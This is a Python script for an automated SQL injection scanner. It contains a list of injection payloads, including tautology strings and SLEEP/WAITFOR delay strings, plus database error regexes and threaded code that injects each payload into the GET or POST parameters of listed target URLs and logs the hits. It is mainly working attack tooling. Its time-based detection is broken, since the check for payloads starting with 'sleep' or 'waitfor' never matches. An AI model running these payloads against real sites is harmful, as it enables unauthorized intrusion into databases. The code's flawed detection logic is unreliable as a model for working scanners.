import requests
import threading
import re
import time
from urllib.parse import urlparse, urlencode
from requests.exceptions import RequestException

# Payloads for detecting SQL Injection vulnerabilities
payloads = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' -- ",
    "\" OR \"1\"=\"1\" -- ",
    "' OR '1'='1' #",
    "\" OR \"1\"=\"1\" #",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1\" /*",
    "'; WAITFOR DELAY '0:0:5'--",
    "\"; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5) --",
    "\" OR SLEEP(5) --",
]

# SQL error patterns for detecting vulnerabilities
error_patterns = [
    "SQL syntax.*MySQL",
    "Warning.*mysql_.*",
    "valid MySQL result",
    "PostgreSQL.*ERROR",
    "Warning.*pg_.*",
    "valid PostgreSQL result",
    "SQL syntax.*PostgreSQL",
    "Microsoft SQL Server.*Driver",
    "Warning.*mssql_.*",
    "valid Microsoft SQL Server result",
    "SQL syntax.*Microsoft SQL Server",
    "ODBC.*Driver",
    "Warning.*odbc_.*",
    "valid ODBC SQL result",
    "ORA-00933: SQL command not properly ended",
    "ORA-00921: unexpected end of SQL command",
    "Warning.*oci_.*",
    "Warning.*ora_.*",
    "valid Oracle SQL result",
]

class SQLiScanner:
    def __init__(self, url, method='GET', data=None, headers=None, proxies=None):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.proxies = proxies or {}
        self.session = requests.Session()
        self.vulnerable = False

    def scan(self):
        parsed_url = urlparse(self.url)
        params = dict([part.split('=') for part in parsed_url.query.split('&')]) if self.method == 'GET' else self.data

        for param in params:
            original_value = params[param]
            for payload in payloads:
                params[param] = payload

                try:
                    if self.method == 'GET':
                        query = urlencode(params)
                        url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query}"
                        response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=10)
                    elif self.method == 'POST':
                        response = self.session.post(self.url, data=params, headers=self.headers, proxies=self.proxies, timeout=10)

                    # Check for SQL errors or delays
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self.vulnerable = True
                            self.report_vulnerability(param, payload, response.text)
                            return

                    # Detect time-based blind SQL injection by checking response time
                    if payload.lower().startswith(('sleep', 'waitfor')):
                        start_time = time.time()
                        if self.method == 'GET':
                            response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=10)
                        elif self.method == 'POST':
                            response = self.session.post(self.url, data=params, headers=self.headers, proxies=self.proxies, timeout=10)
                        elapsed_time = time.time() - start_time

                        if elapsed_time > 5:
                            self.vulnerable = True
                            self.report_vulnerability(param, payload, "Time-based blind SQL injection detected")
                            return

                except RequestException as e:
                    print(f"[ERROR] {e}")
                    continue
                finally:
                    # Reset parameter value
                    params[param] = original_value

        if not self.vulnerable:
            print(f"No vulnerabilities found in {self.url}")

    def report_vulnerability(self, param, payload, message):
        print(f"[VULNERABLE] SQL Injection detected!")
        print(f"Parameter: {param}")
        print(f"Payload: {payload}")
        print(f"Message: {message}")
        print(f"URL: {self.url}")
        with open('vulnerabilities.txt', 'a') as f:
            f.write(f"URL: {self.url}\nParameter: {param}\nPayload: {payload}\nMessage: {message}\n\n")

def scan_thread(url, method='GET', data=None, headers=None, proxies=None):
    scanner = SQLiScanner(url, method, data, headers, proxies)
    scanner.scan()

if __name__ == "__main__":
    target_urls = [
        {"url": "http://example.com/vulnerable.php?id=1", "method": "GET"},
        {"url": "http://example.com/search.php", "method": "POST", "data": {"q": "test"}},
        # Add more target URLs with appropriate methods and data
    ]

    threads = []
    for target in target_urls:
        t = threading.Thread(target=scan_thread, args=(target['url'], target.get('method', 'GET'), target.get('data'), target.get('headers'), target.get('proxies')))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("Scanning completed. Check vulnerabilities.txt for results.")
